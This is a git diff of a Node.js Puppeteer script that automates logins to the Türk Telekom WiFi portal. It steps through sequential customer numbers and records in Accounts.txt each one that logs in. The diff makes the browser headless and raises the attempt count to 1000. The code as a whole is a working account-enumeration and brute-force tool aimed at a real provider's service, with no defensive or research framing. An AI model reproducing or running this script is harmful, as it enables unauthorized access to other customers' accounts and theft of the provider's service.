@@ -1,13 +1,15 @@
 const puppeteer = require("puppeteer");
 const fs = require("fs");
+// Developer Notes
+	//Known Bugs:
+		// skips first two numbers
+		// skips every first number after successfull login
 
-// skips first two numbers
-var user = 2111940;
-var howManyTrys = 500;
+var user = 2113608;
+var howManyTrys = 1000;
 
 var accountFound = false;
 const url = "https://giris.turktelekomwifi.com/#/";
-const url2 = "https://giris.turktelekomwifi.com/#/login/adsl";
 
 const TTMusteri_Button = "#accordingMenuButton";
 const Internet_Button = "#according-menu > button:nth-child(1)";
@@ -28,11 +30,8 @@ async function findInternet(){
 	while (howManyTrys !== 0) {
 
 		await navigateSite(page);
-
         await fillForm(page);	
-
         await exitAccount(page);
-
         await showQuota(page);
 	}
 	
@@ -43,7 +42,7 @@ async function findInternet(){
 async function startBrowser(){
 
 	const browser = await puppeteer.launch({
-		headless: false,
+		headless: true,
 		defaultViewport: null
 	});
 
@@ -55,7 +54,6 @@ async function startBrowser(){
 	return _page;
 }
 
-
 async function navigateSite(page){
 	console.log("navigating");
 	await page.waitForSelector(TTMusteri_Button);
@@ -64,35 +62,18 @@ async function navigateSite(page){
 	await page.waitForSelector(Internet_Button);
 	await page.click(Internet_Button);
 
-
 	await page.waitForSelector(InternetGiris_Button);
 	await Promise.all([
 		page.waitForNavigation(),
 		await page.click(InternetGiris_Button)
 	])
 
-
-
-/* 	await page.waitForSelector(InternetGiris_Button);
-	await page.click(InternetGiris_Button); */
-
-
-
-/*     await page.waitForSelector(checkBoxID);
-    const checkbox = await page.$(checkBoxID);
-    var checked = await (await checkbox.getProperty('checked')).jsonValue();
-	if (!checked){
-		await page.click(checkBoxID);
-	} */
 	await console.log("navigating complete");
-
 }
 
 async function fillForm(page){
 
     console.log("started fillForm")
-
-	//console.log(checked);
 	await page.waitForSelector(checkBoxID);
 	const checkbox = await page.$(checkBoxID);
 	var checked = await (await checkbox.getProperty('checked')).jsonValue();
@@ -106,8 +87,7 @@ async function fillForm(page){
 
 		howManyTrys -= 1;
 		user += 1;
-        console.log(user);
-		
+        console.log(user);	
 
 	    // clear input field
 		async function clear(page, selector) {
@@ -133,20 +113,18 @@ async function fillForm(page){
             fs.appendFile(`${__dirname}\\Accounts.txt`, `\n${user}`, err => {})
             accountFound = true;
         }
-        
 	}
     console.log("exited while loop");
 }
 
 async function exitAccount(page){
     console.log("exiting from account")
-    //await setTimeout(() => {},3000);
+
 	try {
 		await page.waitForSelector(exitButton,{timeout:5000});
 		page.click(exitButton);
 	} catch (error) {
 		console.log("couldn't find exit button");
-		//await page.goto(url);
 	}
 
 	accountFound = false;
